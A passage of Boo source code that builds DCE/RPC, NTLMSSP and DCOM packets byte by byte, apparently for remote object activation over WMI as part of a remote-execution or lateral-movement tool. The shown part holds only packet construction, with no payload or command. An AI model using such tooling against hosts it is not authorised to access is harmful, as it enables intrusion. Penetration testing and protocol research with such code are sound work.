    packet_RPCAuth3.Add('RPCAUTH3_AuthType', (of byte: 10))
    packet_RPCAuth3.Add('RPCAUTH3_AuthLevel', (of byte: 2))
    packet_RPCAuth3.Add('RPCAUTH3_AuthPadLength', (of byte: 0))
    packet_RPCAuth3.Add('RPCAUTH3_AuthReserved', (of byte: 0))
    packet_RPCAuth3.Add('RPCAUTH3_ContextID', (of byte: 0, 0, 0, 0))
    packet_RPCAuth3.Add('RPCAUTH3_NTLMSSP', packet_NTLMSSP)
    return packet_RPCAuth3

  private static def GetPacketRPCRequest(packet_flags as (byte), packet_service_length as int, packet_auth_length as int, packet_auth_padding as int, packet_call_ID as (byte), packet_context_ID as (byte), packet_opnum as (byte), packet_data as (byte)) as OrderedDictionary:
    packet_full_auth_length as int
    packet_write_length as (byte)
    packet_alloc_hint as (byte)
    if packet_auth_length > 0:
      packet_full_auth_length = ((packet_auth_length + packet_auth_padding) + 8)
    else:
      packet_full_auth_length = 0
    if packet_data is not null:
      packet_write_length = BitConverter.GetBytes((((packet_service_length + 24) + packet_full_auth_length) + packet_data.Length))
      packet_alloc_hint = BitConverter.GetBytes((packet_service_length + packet_data.Length))
    else:
      packet_write_length = BitConverter.GetBytes(((packet_service_length + 24) + packet_full_auth_length))
      packet_alloc_hint = BitConverter.GetBytes(packet_service_length)
    packet_frag_length as (byte) = (packet_write_length[0], packet_write_length[1])
    packet_auth_length2 as (byte) = BitConverter.GetBytes(packet_auth_length)
    packet_auth_length3 as (byte) = (packet_auth_length2[0], packet_auth_length2[1])
    packet_RPCRequest = OrderedDictionary()
    packet_RPCRequest.Add('RPCRequest_Version', (of byte: 5))
    packet_RPCRequest.Add('RPCRequest_VersionMinor', (of byte: 0))
    packet_RPCRequest.Add('RPCRequest_PacketType', (of byte: 0))
    packet_RPCRequest.Add('RPCRequest_PacketFlags', packet_flags)
    packet_RPCRequest.Add('RPCRequest_DataRepresentation', (of byte: 16, 0, 0, 0))
    packet_RPCRequest.Add('RPCRequest_FragLength', packet_frag_length)
    packet_RPCRequest.Add('RPCRequest_AuthLength', packet_auth_length3)
    packet_RPCRequest.Add('RPCRequest_CallID', packet_call_ID)
    packet_RPCRequest.Add('RPCRequest_AllocHint', packet_alloc_hint)
    packet_RPCRequest.Add('RPCRequest_ContextID', packet_context_ID)
    packet_RPCRequest.Add('RPCRequest_Opnum', packet_opnum)
    if (packet_data is not null) and (packet_data.Length > 0):
      packet_RPCRequest.Add('RPCRequest_Data', packet_data)
    return packet_RPCRequest

  private static def GetPacketRPCAlterContext(packet_assoc_group as (byte), packet_call_ID as (byte), packet_context_ID as (byte), packet_interface_UUID as (byte)) as OrderedDictionary:
    packet_RPCAlterContext = OrderedDictionary()
    packet_RPCAlterContext.Add('RPCAlterContext_Version', (of byte: 5))
    packet_RPCAlterContext.Add('RPCAlterContext_VersionMinor', (of byte: 0))
    packet_RPCAlterContext.Add('RPCAlterContext_PacketType', (of byte: 14))
    packet_RPCAlterContext.Add('RPCAlterContext_PacketFlags', (of byte: 3))
    packet_RPCAlterContext.Add('RPCAlterContext_DataRepresentation', (of byte: 16, 0, 0, 0))
    packet_RPCAlterContext.Add('RPCAlterContext_FragLength', (of byte: 72, 0))
    packet_RPCAlterContext.Add('RPCAlterContext_AuthLength', (of byte: 0, 0))
    packet_RPCAlterContext.Add('RPCAlterContext_CallID', packet_call_ID)
    packet_RPCAlterContext.Add('RPCAlterContext_MaxXmitFrag', (of byte: 208, 22))
    packet_RPCAlterContext.Add('RPCAlterContext_MaxRecvFrag', (of byte: 208, 22))
    packet_RPCAlterContext.Add('RPCAlterContext_AssocGroup', packet_assoc_group)
    packet_RPCAlterContext.Add('RPCAlterContext_NumCtxItems', (of byte: 1))
    packet_RPCAlterContext.Add('RPCAlterContext_Unknown', (of byte: 0, 0, 0))
    packet_RPCAlterContext.Add('RPCAlterContext_ContextID', packet_context_ID)
    packet_RPCAlterContext.Add('RPCAlterContext_NumTransItems', (of byte: 1))
    packet_RPCAlterContext.Add('RPCAlterContext_Unknown2', (of byte: 0))
    packet_RPCAlterContext.Add('RPCAlterContext_Interface', packet_interface_UUID)
    packet_RPCAlterContext.Add('RPCAlterContext_InterfaceVer', (of byte: 0, 0))
    packet_RPCAlterContext.Add('RPCAlterContext_InterfaceVerMinor', (of byte: 0, 0))
    packet_RPCAlterContext.Add('RPCAlterContext_TransferSyntax', (of byte: 4, 93, 136, 138, 235, 28, 201, 17, 159, 232, 8, 0, 43, 16, 72, 96))
    packet_RPCAlterContext.Add('RPCAlterContext_TransferSyntaxVer', (of byte: 2, 0, 0, 0))
    packet_RPCAlterContext.Add('', (of byte: ,))
    return packet_RPCAlterContext

  private static def GetPacketNTLMSSPVerifier(packet_auth_padding as int, packet_auth_level as (byte), packet_sequence_number as (byte)) as OrderedDictionary:
    packet_NTLMSSPVerifier = OrderedDictionary()
    packet_auth_pad_length as (byte) = null
    if packet_auth_padding == 4:
      packet_NTLMSSPVerifier.Add('NTLMSSPVerifier_AuthPadding', (of byte: 0, 0, 0, 0))
      packet_auth_pad_length = (of byte: 4)
    elif packet_auth_padding == 8:
      packet_NTLMSSPVerifier.Add('NTLMSSPVerifier_AuthPadding', (of byte: 0, 0, 0, 0, 0, 0, 0, 0))
      packet_auth_pad_length = (of byte: 8)
    elif packet_auth_padding == 12:
      packet_NTLMSSPVerifier.Add('NTLMSSPVerifier_AuthPadding', (of byte: 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
      packet_auth_pad_length = (of byte: 12)
    else:
      packet_auth_pad_length = (of byte: 0)
    packet_NTLMSSPVerifier.Add('NTLMSSPVerifier_AuthType', (of byte: 10))
    packet_NTLMSSPVerifier.Add('NTLMSSPVerifier_AuthLevel', packet_auth_level)
    packet_NTLMSSPVerifier.Add('NTLMSSPVerifier_AuthPadLen', packet_auth_pad_length)
    packet_NTLMSSPVerifier.Add('NTLMSSPVerifier_AuthReserved', (of byte: 0))
    packet_NTLMSSPVerifier.Add('NTLMSSPVerifier_ContextID', (of byte: 0, 0, 0, 0))
    packet_NTLMSSPVerifier.Add('NTLMSSPVerifier_NTLMSSPVerifierVersionNumber', (of byte: 1, 0, 0, 0))
    packet_NTLMSSPVerifier.Add('NTLMSSPVerifier_NTLMSSPVerifierChecksum', (of byte: 0, 0, 0, 0, 0, 0, 0, 0))
    packet_NTLMSSPVerifier.Add('NTLMSSPVerifier_NTLMSSPVerifierSequenceNumber', packet_sequence_number)
    return packet_NTLMSSPVerifier

  private static def GetPacketDCOMRemQueryInterface(packet_causality_ID as (byte), packet_IPID as (byte), packet_IID as (byte)) as OrderedDictionary:
    packet_DCOMRemQueryInterface = OrderedDictionary()
    packet_DCOMRemQueryInterface.Add('DCOMRemQueryInterface_VersionMajor', (of byte: 5, 0))
    packet_DCOMRemQueryInterface.Add('DCOMRemQueryInterface_VersionMinor', (of byte: 7, 0))
    packet_DCOMRemQueryInterface.Add('DCOMRemQueryInterface_Flags', (of byte: 0, 0, 0, 0))
    packet_DCOMRemQueryInterface.Add('DCOMRemQueryInterface_Reserved', (of byte: 0, 0, 0, 0))
    packet_DCOMRemQueryInterface.Add('DCOMRemQueryInterface_CausalityID', packet_causality_ID)
    packet_DCOMRemQueryInterface.Add('DCOMRemQueryInterface_Reserved2', (of byte: 0, 0, 0, 0))
    packet_DCOMRemQueryInterface.Add('DCOMRemQueryInterface_IPID', packet_IPID)
    packet_DCOMRemQueryInterface.Add('DCOMRemQueryInterface_Refs', (of byte: 5, 0, 0, 0))
    packet_DCOMRemQueryInterface.Add('DCOMRemQueryInterface_IIDs', (of byte: 1, 0))
    packet_DCOMRemQueryInterface.Add('DCOMRemQueryInterface_Unknown', (of byte: 0, 0, 1, 0, 0, 0))
    packet_DCOMRemQueryInterface.Add('DCOMRemQueryInterface_', packet_IID)
    return packet_DCOMRemQueryInterface

  private static def GetPacketDCOMRemRelease(packet_causality_ID as (byte), packet_IPID as (byte), packet_IPID2 as (byte)) as OrderedDictionary:
    packet_DCOMRemRelease = OrderedDictionary()
    packet_DCOMRemRelease.Add('packet_DCOMRemRelease_VersionMajor', (of byte: 5, 0))
    packet_DCOMRemRelease.Add('packet_DCOMRemRelease_VersionMinor', (of byte: 7, 0))
    packet_DCOMRemRelease.Add('packet_DCOMRemRelease_Flags', (of byte: 0, 0, 0, 0))
    packet_DCOMRemRelease.Add('packet_DCOMRemRelease_Reserved', (of byte: 0, 0, 0, 0))
    packet_DCOMRemRelease.Add('packet_DCOMRemRelease_CausalityID', packet_causality_ID)
    packet_DCOMRemRelease.Add('packet_DCOMRemRelease_Reserved2', (of byte: 0, 0, 0, 0))
    packet_DCOMRemRelease.Add('packet_DCOMRemRelease_Unknown', (of byte: 2, 0, 0, 0))
    packet_DCOMRemRelease.Add('packet_DCOMRemRelease_InterfaceRefs', (of byte: 2, 0, 0, 0))
    packet_DCOMRemRelease.Add('packet_DCOMRemRelease_IPID', packet_IPID)
    packet_DCOMRemRelease.Add('packet_DCOMRemRelease_PublicRefs', (of byte: 5, 0, 0, 0))
    packet_DCOMRemRelease.Add('packet_DCOMRemRelease_PrivateRefs', (of byte: 0, 0, 0, 0))
    packet_DCOMRemRelease.Add('packet_DCOMRemRelease_packet_IPID2', packet_IPID2)
    packet_DCOMRemRelease.Add('packet_DCOMRemRelease_PublicRefs2', (of byte: 5, 0, 0, 0))
    packet_DCOMRemRelease.Add('packet_DCOMRemRelease_PrivateRefs2', (of byte: 0, 0, 0, 0))
    return packet_DCOMRemRelease

  private static def GetPacketDCOMRemoteCreateInstance(packet_causality_ID as (byte), packet_target as string) as OrderedDictionary:
    packet_target_unicode as (byte) = Encoding.Unicode.GetBytes(packet_target)
    packet_target_length as (byte) = BitConverter.GetBytes((packet_target.Length + 1))
    bytesize as double = ((Math.Truncate((((packet_target_unicode.Length cast double) / 8) + 1)) * 8) - packet_target_unicode.Length)
    nulls as (byte) = array(byte, Convert.ToInt32(bytesize))
    packet_target_unicode = CombineByteArray(packet_target_unicode, nulls)
    packet_cntdata as (byte) = BitConverter.GetBytes((packet_target_unicode.Length + 720))
    packet_size as (byte) = BitConverter.GetBytes((packet_target_unicode.Length + 680))
    packet_total_size as (byte) = BitConverter.GetBytes((packet_target_unicode.Length + 664))
    packet_private_header as (byte) = CombineByteArray(BitConverter.GetBytes((packet_target_unicode.Length + 40)), (of byte: 0, 0, 0, 0))
    packet_property_data_size as (byte) = BitConverter.GetBytes((packet_target_unicode.Length + 56))
    packet_DCOMRemoteCreateInstance = OrderedDictionary()
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_DCOMVersionMajor', (of byte: 5, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_DCOMVersionMinor', (of byte: 7, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_DCOMFlags', (of byte: 1, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_DCOMReserved', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_DCOMCausalityID', packet_causality_ID)
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_Unknown', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_Unknown2', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_Unknown3', (of byte: 0, 0, 2, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_Unknown4', packet_cntdata)
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCntData', packet_cntdata)
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesOBJREFSignature', (of byte: 77, 69, 79, 87))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesOBJREFFlags', (of byte: 4, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesOBJREFIID', (of byte: 162, 1, 0, 0, 0, 0, 0, 0, 192, 0, 0, 0, 0, 0, 0, 70))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFCLSID', (of byte: 56, 3, 0, 0, 0, 0, 0, 0, 192, 0, 0, 0, 0, 0, 0, 70))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFCBExtension', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFSize', packet_size)
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesTotalSize', packet_total_size)
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesReserved', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCommonHeader', (of byte: 1, 16, 8, 0, 204, 204, 204, 204))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderPrivateHeader', (of byte: 176, 0, 0, 0, 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderTotalSize', packet_total_size)
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCustomHeaderSize', (of byte: 192, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderReserved', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesDestinationContext', (of byte: 2, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesNumActivationPropertyStructs', (of byte: 6, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsInfoClsid', (of byte: 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrReferentID', (of byte: 0, 0, 2, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrReferentID', (of byte: 4, 0, 2, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesNULLPointer', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrMaxCount', (of byte: 6, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid', (of byte: 185, 1, 0, 0, 0, 0, 0, 0, 192, 0, 0, 0, 0, 0, 0, 70))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid2', (of byte: 171, 1, 0, 0, 0, 0, 0, 0, 192, 0, 0, 0, 0, 0, 0, 70))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid3', (of byte: 165, 1, 0, 0, 0, 0, 0, 0, 192, 0, 0, 0, 0, 0, 0, 70))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid4', (of byte: 166, 1, 0, 0, 0, 0, 0, 0, 192, 0, 0, 0, 0, 0, 0, 70))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid5', (of byte: 164, 1, 0, 0, 0, 0, 0, 0, 192, 0, 0, 0, 0, 0, 0, 70))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid6', (of byte: 170, 1, 0, 0, 0, 0, 0, 0, 192, 0, 0, 0, 0, 0, 0, 70))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrMaxCount', (of byte: 6, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize', (of byte: 104, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize2', (of byte: 88, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize3', (of byte: 144, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize4', packet_property_data_size)
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize5', (of byte: 32, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize6', (of byte: 48, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesCommonHeader', (of byte: 1, 16, 8, 0, 204, 204, 204, 204))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPrivateHeader', (of byte: 88, 0, 0, 0, 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesSessionID', (of byte: 255, 255, 255, 255))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesRemoteThisSessionID', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesClientImpersonating', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionIDPresent', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesDefaultAuthnLevel', (of byte: 2, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionGuid', (of byte: 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesProcessRequestFlags', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesOriginalClassContext', (of byte: 20, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesFlags', (of byte: 2, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesReserved', (of byte: 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesUnusedBuffer', (of byte: 0, 0, 0, 0, 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoCommonHeader', (of byte: 1, 16, 8, 0, 204, 204, 204, 204))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoPrivateHeader', (of byte: 72, 0, 0, 0, 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiatedObjectClsId', (of byte: 94, 240, 195, 139, 107, 216, 208, 17, 160, 117, 0, 192, 79, 182, 136, 32))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoClassContext', (of byte: 20, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoActivationFlags', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoFlagsSurrogate', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInterfaceIdCount', (of byte: 1, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiationFlag', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtr', (of byte: 0, 0, 2, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationEntirePropertySize', (of byte: 88, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMajor', (of byte: 5, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMinor', (of byte: 7, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtrMaxCount', (of byte: 1, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIds', (of byte: 24, 173, 9, 243, 106, 216, 208, 17, 160, 117, 0, 192, 79, 182, 136, 32))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsUnusedBuffer', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoCommonHeader', (of byte: 1, 16, 8, 0, 204, 204, 204, 204))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoPrivateHeader', (of byte: 128, 0, 0, 0, 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientOk', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved2', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved3', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrReferentID', (of byte: 0, 0, 2, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoNULLPtr', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextUnknown', (of byte: 96, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextCntData', (of byte: 96, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFSignature', (of byte: 77, 69, 79, 87))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFFlags', (of byte: 4, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFIID', (of byte: 192, 1, 0, 0, 0, 0, 0, 0, 192, 0, 0, 0, 0, 0, 0, 70))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCLSID', (of byte: 59, 3, 0, 0, 0, 0, 0, 0, 192, 0, 0, 0, 0, 0, 0, 70))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCBExtension', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFSize', (of byte: 48, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoUnusedBuffer', (of byte: 1, 0, 1, 0, 99, 44, 128, 42, 165, 210, 175, 221, 77, 196, 187, 55, 77, 55, 118, 215, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoCommonHeader', (of byte: 1, 16, 8, 0, 204, 204, 204, 204))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoPrivateHeader', packet_private_header)
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoAuthenticationFlags', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoPtrReferentID', (of byte: 0, 0, 2, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoNULLPtr', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved', (of byte: 0, 0, 0, 0))
